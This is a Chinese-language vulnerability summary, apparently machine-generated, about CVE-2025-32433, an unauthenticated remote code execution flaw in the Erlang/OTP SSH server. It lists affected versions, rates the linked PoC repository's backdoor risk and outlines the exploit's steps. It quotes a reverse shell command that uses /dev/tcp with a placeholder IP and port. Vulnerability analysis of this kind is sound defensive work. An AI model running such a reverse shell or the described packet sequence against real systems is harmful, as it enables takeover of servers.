## CVE-2025-32433-Erlang/OTP SSH-RCE

**漏洞编号:** CVE-2025-32433

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Erlang/OTP SSH

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** OTP-27.0-rc1 < OTP-27.3.3, OTP-26.0-rc1 < OTP-26.2.5.11, < OTP-25.3.2.20

**利用条件:** 目标系统运行受影响版本的 Erlang/OTP SSH 服务，且攻击者可以网络访问该服务。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据漏洞信息和搜索结果，CVE-2025-32433 漏洞允许未经身份验证的攻击者在受影响的 Erlang/OTP SSH 服务器上执行远程代码。该漏洞源于 SSH 协议消息处理中的缺陷。 

**有效性：**
根据漏洞库信息、搜索结果，以及漏洞利用代码，该漏洞利用是有效的。搜索结果中多个来源都表明该漏洞允许未经身份验证的 RCE，并且提供了 CVSS 评分 10.0。提供的 Python POC 代码通过发送特定序列的 SSH 消息来利用此漏洞，从而在目标系统上执行任意命令。

**投毒风险：**
代码本身存在植入后门的风险较低，因为代码结构清晰，主要功能是构造恶意SSH请求，没有发现明显的可疑代码或恶意行为。然而，任何远程代码执行漏洞都存在被滥用的可能性，如果攻击者利用此漏洞控制系统，则可以植入任意后门。

**漏洞利用方式：**
1.  **连接目标 SSH 服务：**  POC 脚本首先建立与目标 Erlang/OTP SSH 服务器的连接。
2.  **发送初始数据:** 脚本发送任意字符串，模拟SSH握手过程。
3.  **构造恶意 SSH 消息：**  POC 脚本构建并发送特制的 SSH 协议消息，利用协议处理缺陷。
4.  **`build_channel_open()`** 函数构造一个打开 SSH channel 的请求数据包
5.  **`build_channel_request()`** 函数构造一个在 channel 上执行命令的请求数据包. 默认命令是执行反向 shell, 攻击者替换IP和端口即可。
6.  **触发远程代码执行：**  通过发送畸形或者错误的SSH协议消息，服务器处理过程中，没有进行严格校验， 导致远程代码执行。
7.  **反弹 Shell (Reverse Shell)：** 漏洞利用代码中包含反弹 shell 的命令（`bash -i >& /dev/tcp/IP/PORT 0>&1`），表明成功利用漏洞后，攻击者会在目标系统上执行此命令，从而获得对系统的控制权。
8.  **时间延迟：** 代码中包含多个 `time.sleep()` 调用，这可能是为了确保数据包按预期顺序发送，并给服务器足够的时间来处理它们。

总体而言，该漏洞利用方式相对直接，依赖于构造恶意的 SSH 协议消息来触发服务器端的代码执行。成功利用该漏洞将允许攻击者完全控制受影响的系统。

**项目地址:** [tobiasGuta/Erlang-OTP-CVE-2025-32433](https://github.com/tobiasGuta/Erlang-OTP-CVE-2025-32433)

**漏洞详情:** [CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433)